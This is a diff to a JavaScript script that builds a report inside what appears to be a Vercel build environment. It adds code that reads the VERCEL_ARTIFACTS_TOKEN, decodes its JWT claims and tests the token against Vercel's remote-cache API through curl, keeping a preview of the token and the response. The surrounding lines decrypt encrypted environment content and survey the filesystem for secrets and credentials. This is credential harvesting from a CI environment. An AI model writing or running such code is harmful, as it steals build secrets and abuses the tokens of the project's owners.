@@ -223,6 +223,27 @@ const report = {
     process.env.VERCEL_ENV_ENC_KEY,
     process.env.VERCEL_ENCRYPTED_ENV_CONTENT
   )),
+  // VERCEL_ARTIFACTS_TOKEN — Turborepo remote cache token; check scope and claims
+  artifactsToken: safe(() => {
+    const tok = process.env.VERCEL_ARTIFACTS_TOKEN;
+    if (!tok) return "absent";
+    // Decode JWT if it is one
+    const parts = tok.split('.');
+    if (parts.length === 3) {
+      try {
+        const claims = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
+        return { type: 'jwt', claims };
+      } catch(_) {}
+    }
+    // Try Turborepo Remote Cache API with this token
+    const artifactsOwner = process.env.VERCEL_ARTIFACTS_OWNER || '';
+    const apiBase = 'https://vercel.com/api/remote-cache/v8/artifacts';
+    const listStatus = safe(() => execSync(
+      `curl -s --max-time 5 -o /tmp/art_list -w '%{http_code}' -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${apiBase}?teamId=${artifactsOwner}&limit=5' || true`
+    ).toString().trim());
+    const listBody = safe(() => readFileSync('/tmp/art_list', 'utf8').slice(0, 500));
+    return { type: 'token', len: tok.length, preview: tok.slice(0, 12) + '...', listStatus, listBody };
+  }),
   // Filesystem survey — looking for secrets, config files, other credentials
   filesystemSurvey: safe(() => ({
     vercelDir: safe(() => execSync("ls -la /vercel/ 2>/dev/null | head -20 || true").toString().trim()),
